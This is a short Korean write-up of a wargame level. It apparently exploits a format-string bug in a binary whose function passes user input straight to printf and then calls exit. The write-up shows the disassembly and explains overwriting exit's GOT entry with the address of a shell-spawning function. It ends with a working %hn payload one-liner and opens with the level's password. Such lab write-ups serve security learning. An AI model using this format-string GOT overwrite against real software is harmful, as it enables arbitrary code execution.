> Password: 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a

저번 단계와 비슷하게 printf를 이용하는 문제이다. 다만 모든 함수 호출에서 ret 대신 _exit(2) / exit(3)등이 있어서 ret 주소를 조작하는 방식으로는 해결할 수 없다.

```
080484c2 <n>:
 80484c2:	55                   	push   %ebp
 80484c3:	89 e5                	mov    %esp,%ebp
 80484c5:	81 ec 18 02 00 00    	sub    $0x218,%esp
 80484cb:	a1 48 98 04 08       	mov    0x8049848,%eax
 80484d0:	89 44 24 08          	mov    %eax,0x8(%esp)
 80484d4:	c7 44 24 04 00 02 00 	movl   $0x200,0x4(%esp)
 80484db:	00 
 80484dc:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
 80484e2:	89 04 24             	mov    %eax,(%esp)
 80484e5:	e8 b6 fe ff ff       	call   80483a0 <fgets@plt>
 80484ea:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
 80484f0:	89 04 24             	mov    %eax,(%esp)
 80484f3:	e8 88 fe ff ff       	call   8048380 <printf@plt>
 80484f8:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
 80484ff:	e8 cc fe ff ff       	call   80483d0 <exit@plt>
```

하지만 exit(3)함수가 정적 링킹이 아니라 동적 링킹으로 위치를 찾아 호출하는 함수라는 점을 이용해서 실제 exit(3)의 위치를 가지고 있는 got테이블의 값을 o라는 쉘을 호출해주는 함수의 주소로 조작하면 된다.

```bash
cat <(python -c 'print "\x38\x98\x04\x08%.0s%.0s%033952x%hn",') - | ./level5
```